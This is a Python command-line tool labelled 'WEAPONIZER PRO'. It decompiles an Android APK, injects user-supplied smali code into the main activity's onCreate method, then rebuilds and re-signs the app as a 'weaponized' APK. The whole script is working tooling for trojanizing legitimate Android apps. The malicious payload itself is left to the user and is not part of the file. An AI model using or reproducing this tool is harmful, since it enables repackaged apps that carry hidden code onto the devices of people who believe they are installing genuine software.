import subprocess
import re
import os
import sys
import time
from shutil import which

# --- CONFIGURAÇÃO DE AMBIENTE ---
RED, DARK_RED, WHITE, BOLD, RESET, YELLOW, GREEN = "\33[91m", "\33[31m", "\33[97m", "\33[1m", "\33[0m", "\33[93m", "\33[92m"

def log(msg, level="info"):
    p = {"info": f"{WHITE}[*]{RESET}", "success": f"{GREEN}[+]{RESET}", "warn": f"{YELLOW}[!]{RESET}", "error": f"{BOLD}{RED}[-]{RESET}"}
    print(f"{p.get(level, '[*]')} {msg}")

def exibir_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner = fr"""
{RED} ██╗    ██╗███████╗ █████╗ ██████╗  ██████╗ ███╗   ██╗██╗███████╗███████╗██████╗ 
{RED} ██║    ██║██╔════╝██╔══██╗██╔══██╗██╔═══██╗████╗  ██║██║╚══███╔╝██╔════╝██╔══██╗
{DARK_RED} ██║ █╗ ██║█████╗  ███████║██████╔╝██║   ██║██╔██╗ ██║██║  ███╔╝ █████╗  ██████╔╝
{DARK_RED} ██║███╗██║██╔══╝  ██╔══██║██╔═══╝ ██║   ██║██║╚██╗██║██║ ███╔╝  ██╔══╝  ██╔══██╗
{RED} ╚███╔███╔╝███████╗██║  ██║██║     ╚██████╔╝██║ ╚████║██║███████╗███████╗██║  ██║
{RED}  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
{RESET}
 {WHITE}{BOLD}WEAPONIZER PRO{RESET} | {WHITE}Mode: AUTOMATED INJECTION (Red Edition){RESET}
 {DARK_RED}─────────────────────────────────────────────────────────────────────────────{RESET}
    """.strip()
    print(banner)

def injetar_payload_smali(project_folder):
    """Localiza a MainActivity e injeta o código automaticamente no onCreate."""
    manifest = os.path.join(project_folder, "AndroidManifest.xml")
    if not os.path.exists(manifest):
        log("Erro: Manifesto não encontrado!", "error"); return False

    # 1. Detectar MainActivity
    with open(manifest, "r") as f:
        content = f.read()
        match = re.search(r'<activity [^>]*android:name="([^"]+)"', content)
        if not match: log("MainActivity não detectada!", "error"); return False
        main_activity = match.group(1)

    # 2. Localizar Arquivo Smali
    smali_path = os.path.join(project_folder, "smali", main_activity.replace('.', '/') + ".smali")
    if not os.path.exists(smali_path):
        # Tenta em smali_classes2 se não encontrar no 1
        smali_path = os.path.join(project_folder, "smali_classes2", main_activity.replace('.', '/') + ".smali")
    
    if not os.path.exists(smali_path):
        log(f"Arquivo Smali não encontrado: {smali_path}", "error"); return False

    print(f"\n{GREEN}[!] ALVO DETECTADO:{RESET} {BOLD}{main_activity}{RESET}")
    payload = input(f"{YELLOW}» Cole seu código de Injeção/Hook aqui:{RESET}\n{BOLD}# {RESET}").strip()
    
    if not payload:
        log("Injeção cancelada: Payload vazio.", "warn"); return False

    # 3. Realizar a Injeção no onCreate
    log("Injetando payload no ponto de Hook...", "info")
    with open(smali_path, "r") as f:
        lines = f.readlines()

    new_lines = []
    in_oncreate = False
    injected = False

    for line in lines:
        new_lines.append(line)
        # Procura o início do método onCreate
        if ".method" in line and "onCreate(Landroid/os/Bundle;)V" in line:
            in_oncreate = True
        
        # Injeta logo após o super.onCreate ou após locals
        if in_oncreate and not injected:
            if "invoke-super" in line or ".locals" in line:
                new_lines.append(f"\n    # --- WEAPONIZER INJECTION BEGIN ---\n")
                new_lines.append(f"    {payload}\n")
                new_lines.append(f"    # --- WEAPONIZER INJECTION END ---\n\n")
                injected = True
        
        if ".end method" in line:
            in_oncreate = False

    if injected:
        with open(smali_path, "w") as f:
            f.writelines(new_lines)
        log("Injeção realizada com sucesso no código-fonte!", "success")
        return True
    else:
        log("Erro: Não foi possível localizar o método onCreate para injeção.", "error")
        return False

def build_e_assinar(out):
    """Recompila, alinha e assina o APK."""
    final_apk = f"{out}_weaponized.apk"
    log(f"Compilando projeto '{out}'...", "info")
    
    res = subprocess.run(["apktool", "b", out, "-o", "tmp.apk"], capture_output=True, text=True)
    if res.returncode != 0:
        log("Erro na compilação smali!", "error")
        print(f"{RED}Apktool Error:{RESET}\n{res.stderr}"); return

    ks = "debug.keystore"
    if not os.path.exists(ks):
        log("Gerando Keystore...", "info")
        subprocess.run(["keytool", "-genkey", "-v", "-keystore", ks, "-alias", "dev", "-keyalg", "RSA", "-keysize", "2048", "-validity", "10000", "-storepass", "android", "-keypass", "android", "-dname", "CN=Weaponizer"], capture_output=True)

    log("Assinando e finalizando artefato...", "info")
    subprocess.run(["apksigner", "sign", "--ks", ks, "--ks-pass", "pass:android", "--out", final_apk, "tmp.apk"])
    if os.path.exists("tmp.apk"): os.remove("tmp.apk")
    
    log(f"PRONTO! APK Armado: {BOLD}{final_apk}{RESET}", "success")
    input(f"\n{YELLOW}Pressione Enter para voltar ao HUD...{RESET}")

def main():
    while True:
        exibir_banner()
        print(f" [{RED}1{RESET}] Decompile (Preparar)")
        print(f" [{RED}2{RESET}] Auto-Inject & Build (Armar e Assinar)")
        print(f" [{RED}3{RESET}] Sair")
        
        op = input(f"\n {BOLD}{RED}WEAPONIZER@pentest:~# {RESET}").strip()
        
        if op == "1":
            path = input(f" {RED}»{RESET} Arquivo APK: ").strip()
            if os.path.exists(path):
                out = os.path.splitext(os.path.basename(path))[0]
                subprocess.run(["apktool", "d", path, "-o", out, "-f"])
                log(f"Projeto descompilado na pasta: {out}", "success")
                input("\nPressione Enter para voltar...")
            else: log("APK não encontrado.", "error"); time.sleep(1)

        elif op == "2":
            out = input(f" {RED}»{RESET} Pasta do projeto: ").strip().rstrip('/')
            if os.path.isdir(out):
                # O fluxo agora é ATÔMICO: Injeta -> Build -> Sign
                if injetar_payload_smali(out):
                    build_e_assinar(out)
            else: log("Pasta não encontrada.", "error"); time.sleep(1)
        
        elif op == "3": break

if __name__ == "__main__":
    main()
